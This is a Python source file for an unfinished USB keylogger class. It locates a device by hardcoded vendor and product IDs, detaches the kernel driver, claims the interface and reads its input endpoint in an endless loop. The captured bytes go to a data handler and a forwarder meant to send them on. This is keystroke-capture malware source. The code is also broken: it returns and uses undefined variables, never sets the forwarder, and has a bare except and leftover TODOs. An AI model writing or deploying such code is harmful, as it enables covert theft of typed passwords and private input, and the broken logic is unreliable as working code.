import logging
from typing import Optional
import usb.core, usb.util
from src.DataHandler import DataHandler
from src.USBForwarder import USBForwarder


class NoDeviceFound(Exception):
    def __init__(self, devices: list = []):
        super().__init__(f"No forward device found in {devices}")


class KeyLogger:
    __slots__ = ["__devices", "data_handler", "__USBForwarder"]

    def __init__(self, data_handler: DataHandler) -> None:
        self.__devices: list = self.get_devices()
        self.data_handler = data_handler
        # TODO add later USB Forwader
        #self.__USBForwarder = USBForwarder(self.__find_device(with_device="forward"))

    def __del__(self):
        pass

    def __find_device(self, with_device: str = "forward") -> Optional[usb.core.Device]:
        id_vendor: int = 0x1c4f
        device_id: int = 0x008b
#        for device in self.__devices:
#            # TODO set right device here
#            print(f'{device}   233')
#            if with_device == "forward":
#                pass
#            elif with_device == "receive":
#                pass
        if id_vendor == 0 or device_id == 0:
            # raise NoDeviceFound(self.__devices)
            pass
        else:
            try:
                # Find the USB device
                dev = usb.core.find(idVendor=id_vendor, idProduct=device_id)
                if dev.is_kernel_driver_active(0):
                    try:
                        dev.detach_kernel_driver(0)
                    except usb.core.USBError as e:
                        print("Could not detach kernel driver: %s" % str(e))

                # Release the device from any other processes
                usb.util.dispose_resources(dev)

                # Check if the device is still busy
                if dev.is_kernel_driver_active(0):
                    print("Device is still busy, could not release resources")
                    logging.error("FEEEEEEEEEEEEEEEEEEHLER")
#            device: Optional[usb.core.Device] = usb.core.find(
#                idVendor=id_vendor, idProduct=device_id
            except:
                print("4848")
#            )
        return device

    @staticmethod
    def get_devices() -> list[[int, int]]:
        devices = usb.core.find(find_all=True)
        found_devices: list[[int, int]] = []
        # Enumerate over all USB devices
        for device in devices:
            print(device)
            try:
                found_devices.append([device.idVendor, device.idProduct])
            except usb.core.USBError as e:
                print(f"Error reading Vendor ID: {e}")
        return found_devices

    # TODO: Rewrite this code
    def run(self):
        device =self.__find_device()
        # # Geräteinformationen
        # for device in self.__devices:
        #     try:
        #         vendor_id: int = device[0]
        #         product_id: int = device[1]
        #         # USB-Gerät finden
        #         dev = usb.core.find(idVendor=vendor_id, idProduct=product_id)
        #         if dev is None:
        #             raise ValueError("USB-Device not found")
        #         # USB-Gerät öffnen
        #         dev.set_configuration()
        #     except Exception as e:
        #         logging.error(f"Error reading Vendor ID: {e}")

        usb.util.claim_interface(dev, 0)
        try:
            # Endlosschleife zum Abhören des USB-Verkehrs
            while True:
                data: any = dev.read(
                    0x81, 64
                )  # Endpoint-Adresse und Puffergröße anpassen
                self.__USBForwarder.send_data(data)
                self.data_handler.write(data)
        except KeyboardInterrupt:
            pass
        finally:
            usb.util.release_interface(dev, 0)
            dev.reset()
